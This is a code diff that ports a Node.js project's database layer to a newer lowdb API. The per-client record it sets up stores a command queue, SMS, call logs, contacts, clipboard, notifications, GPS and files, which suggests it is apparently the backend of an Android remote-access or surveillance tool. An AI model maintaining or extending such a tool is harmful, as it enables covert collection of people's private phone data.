@@ -1,9 +1,8 @@
-const
-    lowdb = require('lowdb'),
-    FileSync = require('lowdb/adapters/FileSync'),
-    path = require('path'),
-    adapter = new FileSync('./maindb.json'),
-    db = lowdb(adapter);
+const { Low, JSONFile } = require('lowdb');
+const path = require('path');
+
+const mainDbAdapter = new JSONFile('./maindb.json');
+const db = new Low(mainDbAdapter);
 
 db.defaults({
     admin: {
@@ -18,26 +17,25 @@ db.defaults({
 
 class clientdb {
     constructor(clientID) {
-        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
-        cdb.defaults({
-            clientID,
-            CommandQue: [],
-            SMSData: [],
-            CallData: [],
-            contacts: [],
-            wifiNow: [],
-            wifiLog: [],
-            clipboardLog: [],
-            notificationLog: [],
-            enabledPermissions: [],
-            apps: [],
-            GPSData: [],
-            GPSSettings: {
-                updateFrequency: 0
-            },
-            downloads: [],
-            currentFolder: []
-        }).write()
+        const clientDbAdapter = new JSONFile('./clientData/' + clientID + '.json');
+        const cdb = new Low(clientDbAdapter);
+        cdb.data = cdb.data || {};
+        cdb.data.clientID = clientID;
+        cdb.data.CommandQue = cdb.data.CommandQue || [];
+        cdb.data.SMSData = cdb.data.SMSData || [];
+        cdb.data.CallData = cdb.data.CallData || [];
+        cdb.data.contacts = cdb.data.contacts || [];
+        cdb.data.wifiNow = cdb.data.wifiNow || [];
+        cdb.data.wifiLog = cdb.data.wifiLog || [];
+        cdb.data.clipboardLog = cdb.data.clipboardLog || [];
+        cdb.data.notificationLog = cdb.data.notificationLog || [];
+        cdb.data.enabledPermissions = cdb.data.enabledPermissions || [];
+        cdb.data.apps = cdb.data.apps || [];
+        cdb.data.GPSData = cdb.data.GPSData || [];
+        cdb.data.GPSSettings = cdb.data.GPSSettings || { updateFrequency: 0 };
+        cdb.data.downloads = cdb.data.downloads || [];
+        cdb.data.currentFolder = cdb.data.currentFolder || [];
+        cdb.write();
         return cdb;
     }
 }
